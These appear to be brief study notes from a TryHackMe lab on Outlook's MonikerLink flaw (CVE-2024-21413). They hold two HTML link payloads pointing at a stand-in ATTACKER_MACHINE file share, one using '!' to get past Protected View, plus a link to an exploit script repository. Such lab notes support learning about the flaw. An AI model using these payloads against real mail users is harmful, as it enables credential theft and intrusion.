# Moniker Link (CVE-2024-21413)

```
<p><a href="file://ATTACKER_MACHINE/test">Click me</a></p>
```
`!` is a special character used to bypass Outlook's "Protected View"
```
<p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>
```


https://github.com/CMNatic/CVE-2024-21413

This Python script is used to abuse the CVE-2024-21413 coined "MonikerLink" TryHackMe Room: MonikerLink